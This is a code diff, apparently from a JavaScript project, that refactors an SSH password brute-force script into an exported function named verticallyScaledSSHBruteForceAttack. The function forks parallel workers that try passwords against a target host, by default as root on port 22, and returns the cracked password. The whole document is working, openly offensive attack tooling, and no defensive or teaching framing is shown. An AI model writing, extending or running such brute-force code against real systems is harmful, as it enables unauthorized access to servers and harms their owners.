@@ -1,47 +1,47 @@
-const options = require('minimist')(process.argv)
-const humanizeDuration = require('humanize-duration')
 const sshBruteForce = require('./utils/sshBruteForce')
 const verticalScaling = require('./utils/verticalScaling')
 
-const startTime = Date.now()
-const host = options.host || '127.0.0.1'
-const port = options.port || 22
-const username = options.username || 'root'
-const verbose = options.verbose || options.v
-const forks = options.forks
-
-verticalScaling({
-  verbose,
+function verticallyScaledSSHBruteForceAttack({
+  host = '127.0.0.1',
+  username = 'root',
+  port = 22,
+  verbose = false,
+  onFailure = () => undefined,
+  errorRetryDelay = 1000,
   forks,
-  onFork: async ({ index, forks, filter }) => {
-    try {
-      const password = await sshBruteForce({
-        host,
-        port,
-        username,
-        verbose,
-        filter: (password, passwordIndex) => filter(passwordIndex),
-        onFailure: (password, passwordIndex) =>
-          verbose
-            ? console.log(`Password ${password} (${passwordIndex}) fail on fork ${index}`)
-            : process.stdout.write('.'),
-      })
-      process.stdout.write('\n')
+}) {
+  return new Promise((resolve, reject) =>
+    verticalScaling({
+      verbose,
+      forks,
+      onFork: async ({ filter, index }) => {
+        try {
+          const password = await sshBruteForce({
+            host,
+            port,
+            username,
+            verbose,
+            errorRetryDelay,
+            onFailure: (currentPassword, passwordIndex) =>
+              onFailure(currentPassword, passwordIndex, index),
+            filter: (currentPassword, passwordIndex) => filter(passwordIndex),
+          })
 
-      console.log(`Elapsed time: ${humanizeDuration(Date.now() - startTime)}`)
+          if (password !== null) {
+            resolve(password)
+          } else {
+            throw new Error('Password not found!')
+          }
+        } catch (error) {
+          reject(error)
+        }
+      },
+      onMaster: () =>
+        verbose
+          ? console.log(`Trying SSH connections to ${username}@${host} on port ${port}`)
+          : undefined,
+    }),
+  )
+}
 
-      if (password !== null) {
-        console.log(`Password is "${password}"`)
-      } else {
-        throw new Error('Password not found!')
-      }
-
-      process.exit(0)
-    } catch (error) {
-      console.error(error)
-      process.exit(1)
-    }
-  },
-
-  onMaster: () => console.log(`Trying SSH connections to ${username}@${host} on port ${port}`),
-})
+module.exports = verticallyScaledSSHBruteForceAttack
